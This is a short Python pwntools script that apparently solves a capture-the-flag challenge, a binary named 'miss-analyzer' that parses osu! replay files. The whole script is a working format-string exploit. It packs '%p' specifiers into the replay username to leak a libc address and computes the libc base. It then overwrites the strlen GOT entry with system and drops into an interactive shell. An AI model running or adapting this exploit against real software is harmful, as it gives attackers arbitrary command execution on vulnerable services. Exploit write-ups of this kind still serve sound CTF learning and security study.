from osrparse import Replay
from pwn import *
import binascii

context.log_level = "debug"
context.bits = 64

p = remote("localhost", 7273)
# p = process("../miss-analyzer/analyzer")
libc = ELF('../miss-analyzer/libc.so.6')
elf = ELF('../miss-analyzer/analyzer')

replay = Replay.from_path("test.osr")
replay.username = "%p "*64
data = replay.pack()

p.recvuntil(b"Submit replay")
p.sendline(binascii.hexlify(data))
p.recvuntil(b"Player name: ")

leek = int(p.readline().split(b" ")[50], 16)
print(f"libc leak = {hex(leek)}")
libc_base = leek - 0x29d90
print(f"libc base = {hex(libc_base)}")

libc.address = libc_base
payload = fmtstr_payload(14, {elf.got['strlen']: libc.sym['system']})
print(payload)
input("ready?")

replay.username = payload.decode()
data = replay.pack()

p.recvuntil(b"Submit replay")
p.sendline(binascii.hexlify(data))

p.interactive()